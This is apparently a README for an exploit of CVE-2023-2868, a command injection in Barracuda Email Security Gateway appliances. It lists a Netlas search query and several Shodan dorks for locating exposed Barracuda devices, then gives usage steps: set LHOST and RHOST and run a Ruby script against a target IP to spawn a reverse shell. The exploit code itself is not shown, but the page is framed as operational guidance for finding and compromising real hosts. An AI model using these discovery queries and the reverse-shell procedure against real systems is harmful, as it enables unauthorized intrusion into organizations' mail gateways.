# CVE-2023-2868
Barracuda ESG Command Injection 
- [Netlas Search Link](https://app.netlas.io/responses/?q=http.headers.server:"BarracudaHTTP")

- Shodan dorks:
```
"Barracuda"
```
```
html:app_common::nonetwork.title
```
```
html:app_common::nonetwork.message
```
```
http.favicon.hash:1436966696
```
- Usage
Set LHOST and RHOST variables to your listener.

```
ruby exploit.rb <TARGET_IP>
```

This will spawn a reverse shell.
